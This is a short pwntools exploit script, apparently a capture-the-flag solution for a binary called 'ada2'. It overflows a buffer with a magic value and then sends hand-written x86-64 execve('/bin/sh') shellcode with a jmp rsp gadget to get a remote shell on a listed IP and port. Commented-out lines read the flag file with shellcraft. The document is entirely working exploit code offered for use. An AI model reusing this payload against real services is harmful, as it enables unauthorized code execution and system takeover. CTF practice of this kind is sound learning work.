from pwn import *

#io = process('./ada2')
#io = remote('ephemerally.top',28034)
io = remote('210.30.97.133',28019)
context.arch = 'amd64'
context.log_level = 'debug'
#raw_input()

payload = b'\x61' * 0x18 + p64(0x66696e65676f6f64) # 进入if内部

io.recvuntil(b'open sesame: ')
io.send(payload)

sleep(1)
p_jmp_rsp = 0x4006c1
#payload2 = asm(shellcraft.read(0,0x601010,500)) + asm("mov rdi,0x601010;call rdi")
#payload2 = asm(shellcraft.sh())
sc = asm('''
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
         ''')
payload2 = sc

payload2 = payload2.ljust(0x28,b'\x00')
payload2 += p64(p_jmp_rsp)
payload2 += asm("sub rsp,0x30;jmp rsp")

io.send(payload2)

# sleep(1)
# payload3 = asm(shellcraft.open('./flag'))
# payload3 += asm(shellcraft.read(3,0x601010+0x300,0x100))#about that 0x300 you add anymore is not importance you just need to sure  mmap_place+x in vmmap around
# payload3 += asm(shellcraft.write(1,0x601010+0x300,0x100))
# io.send(payload3)

io.interactive()
